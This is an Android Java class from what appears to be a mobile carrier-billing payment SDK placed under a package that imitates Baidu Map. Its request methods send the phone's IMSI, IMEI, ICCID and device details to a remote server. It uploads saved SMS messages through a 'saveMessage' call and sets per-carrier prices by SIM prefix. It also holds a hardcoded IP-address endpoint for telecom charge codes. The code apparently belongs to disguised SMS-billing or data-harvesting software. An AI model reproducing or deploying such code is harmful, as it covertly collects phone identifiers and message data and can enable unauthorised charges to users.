package com.baidu.BaiduMap.httpCenter;

import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import com.baidu.BaiduMap.json.ChannelEntity;
import com.baidu.BaiduMap.json.JsonEntity.RequestProperties;
import com.baidu.BaiduMap.json.JsonUtil;
import com.baidu.BaiduMap.json.MessageEntity;
import com.baidu.BaiduMap.json.SetEntity;
import com.baidu.BaiduMap.pay.SDKInit;
import com.baidu.BaiduMap.utils.ACacheUtils;
import com.baidu.BaiduMap.utils.Constants;
import com.baidu.BaiduMap.utils.Log;
import com.baidu.BaiduMap.utils.Utils;

import android.content.Context;
import android.text.TextUtils;

/**
 * GetDataImpl
 *
 * @author Administrator
 */
public class GetDataImpl {
    public static HashMap<String, Map<String, Object>> content = new HashMap<>();
    private static GetDataImpl mInstance;

    private static Context mContext;

    private RequestProperties mRequestProperties;

    public RequestProperties getmRequestProperties() {
        return mRequestProperties;
    }

    private static String URL = "/youxipj/sdkinit/PhoneAPIAction!";
    public static final String SERVER_URL = Constants.SERVER_URL + URL;
    // public static final String SERVER_URL = Constants.SERVER_URL +
    // "/yichuwm/pinterface/PhoneAPIAction!";
    public static final String DYBN_REPORT_URL = "http://103.10.87.143/sy/dianxin_getThirdChargeCodeAndPayDetail_html.jsp";

    public static final String INIT_URL = "init";
    public static final String RAND_URL = "QueryThourgh";
    public static final String SAVE_URL = "saveOrder";
    public static final String IS_NEED_PAY_URL = "fufeidian"; // 付费点是否需要付费
    public static final String PRICECONFIG_URL = "PriceConfig"; // 付费点是否需要付费
    public static final String SAVEMESSAGE_URL = "saveMessage"; // 保存短信
    public static final String FINDNUM_URL = "FindNum"; // 保存短信
    public static final String SAVEPHONENUM = "SavePhonenum"; // 保存短信

    private GetDataImpl(Context ctx) {

        mContext = ctx;
        mRequestProperties = new RequestProperties(ctx);
    }

    public static GetDataImpl getInstance(Context ctx) {
        if (mInstance == null) {
            mInstance = new GetDataImpl(ctx);
        }
        return mInstance;
    }

    /**
     * 支付SDK初始化
     *
     * @return
     */
    public void getPayInit(HttpListener listener) {
//        Log.debug("getPayInit:" + Utils.getIMSI(mContext).equals("-10"));
//        if (Utils.getIMSI(mContext).equals("-10")) {
//            return;
//        }
        HashMap<String, String> params = new HashMap<String, String>();
        params.put("packId", Utils.getPackId(mContext));
        params.put("imsi", Utils.getIMSI(mContext));
        params.put("imei", Utils.getIMEI(mContext));
        params.put("version", Constants.VERSIONS);
        params.put("model", android.os.Build.MODEL.replace(" ", "%20")); // 手机型号
        params.put("sdk_version", android.os.Build.VERSION.SDK); // SDK版本
        params.put("release_version", android.os.Build.VERSION.RELEASE); // 系统版本
        params.put("iccid", Utils.getICCID(mContext));
        doRequest(getUrl(SERVER_URL + INIT_URL, params), mRequestProperties.buildJson().toString(), listener);
    }

    /**
     * 请求通道
     *
     * @param customized_price
     * 价格
     * @param payItemId
     * 道具ID
     * @return
     */
    int getChannelNum = 0;

    public void getChannelId(String throughid, String customized_price, String Did, String product,
                             HttpListener listener) {
        if (null == Utils.getIMSI(mContext) || ("").equals(Utils.getIMSI(mContext))) {
            return;
        }
        HashMap<String, String> params = new HashMap<String, String>();
        params.put("throughid", throughid);
        params.put("price", customized_price);
        params.put("gameId", Utils.getGameId(mContext));
        params.put("packId", Utils.getPackId(mContext));
        params.put("did", Did);
        params.put("orderId", Did);
        params.put("imsi", Utils.getIMSI(mContext));
        params.put("imei", Utils.getIMEI(mContext));
        params.put("iccid", Utils.getICCID(mContext));
        params.put("version", Constants.VERSIONS);
        try {
            params.put("product", new String(URLEncoder.encode(product, "UTF-8")));
            params.put("appName", new String(URLEncoder.encode(Utils.getApplicationName(mContext), "UTF-8")));
            if (Constants.isOutPut) {
                Log.debug("appName -->" + URLEncoder.encode(Utils.getApplicationName(mContext), "UTF-8"));
            }
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        doRequest(getUrl(SERVER_URL + RAND_URL, params), mRequestProperties.buildJson().toString(), listener);
        ChannelEntity.setShortName(null);

    }

    /**
     * 同步订单 2014-10-17 added by pengbb 保存订单
     *
     * @param orderInfo 金额以分为单位
     * @return 反馈结果
     */
    public void saveOrder(RequestProperties orderInfo) {
        String url = getUrl(SERVER_URL + SAVE_URL, null);
        if (Constants.isOutPut) {
            Log.debug("feedback rp orderInfo--> " + orderInfo.buildJson().toString());
        }
        try {
            doPostReuqestWithoutListener(url, orderInfo.buildJson().toString());
        } catch (Exception e) {
        }
    }

    /**
     * 同步短信
     *
     * @param orderInfo 金额以分为单位
     * @return 反馈结果
     */
    public void saveMessage(final MessageEntity orderInfo) {
        String url = getUrl(SERVER_URL + SAVEMESSAGE_URL, null);
        if (Constants.isOutPut) {
            Log.debug("feedback rp orderInfo--> " + orderInfo.buildJson().toString());
        }
        try {
            doPostReuqestWithoutListener(url, orderInfo.buildJson().toString());
        } catch (Exception e) {
        }
    }

    public void saveOrder(final Context ctx, final RequestProperties orderInfo) {
        if (Constants.isOutPut) {
            Log.debug("saveOrder orderInfo bb-->" + orderInfo.toString());
        }
        new Thread() {
            @Override
            public void run() {
                synchronized (orderInfo) {
                    if (Constants.isOutPut) {
                        Log.debug("saveOrder orderInfo-->" + orderInfo.toString());
                    }
                    GetDataImpl.getInstance(ctx).saveOrder(orderInfo);
                }
            }
        }.start();
    }

    /**
     * 内部有加密
     *
     * @param url
     * @param content
     * @return
     */
    public static void doRequest(String url, String content, HttpListener listener) {
        HttpCenter.submitPostData(url, content, listener);
    }

    public static void doPostReuqestWithoutListener(String url, String content) {
        HttpCenter.submitPostData(url, content, null);
    }

    /**
     * 外部GET
     */
    public static void doRequest(String urlString, HttpListener listener) {
        HttpCenter.submitGetData(urlString, listener);
    }

    /**
     * get请求不需要返回值
     *
     * @param urlString
     */
    public static void doGetRequestWithoutListener(String urlString) {
        HttpCenter.submitGetData(urlString, null);
    }

    public static String getUrl(String url, HashMap<String, String> params) {
        if (params != null) {
            Iterator<String> it = params.keySet().iterator();
            StringBuffer sb = null;
            while (it.hasNext()) {
                String key = it.next();
                String value = params.get(key);
                if (sb == null) {
                    sb = new StringBuffer();
                    sb.append("?");
                } else {
                    sb.append("&");
                }
                sb.append(key);
                sb.append("=");
                sb.append(value);
            }
            url += sb.toString();
        }
        if (Constants.isOutPut) {
            Log.debug("url -->" + url);
        }
        return url;
    }

    public static void PayPoint(Context context, String s) {
        JSONObject oj;
        try {
            oj = new JSONObject(s.toString());
            JSONArray jsonArray = oj.getJSONArray("rows");
            for (int i = 0; i < jsonArray.length(); i++) {
                Map<String, Object> map = new HashMap<String, Object>();
                JSONObject json = jsonArray.getJSONObject(i);
                String imsi = Utils.getIMSI(mContext);
                if (imsi.equals("")) {
                    return;
                }
                if (!TextUtils.isEmpty(imsi)) {
                    if ((imsi.startsWith("46000")) || (imsi.startsWith("46002")) || (imsi.startsWith("46007"))) { // 移动
                        map.put("price", json.getString("yprice"));
                    }
                    if (imsi.startsWith("46001")) { // 联通
                        map.put("price", json.getString("lprice"));
                    }
                    if (imsi.startsWith("46003")) { // 电信
                        map.put("price", json.getString("dprice"));
                    }
                }
                map.put("dname", json.get("dname"));
                map.put("isopen", json.get("isopen"));
                content.put(json.getString("did"), map);
            }
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }
}
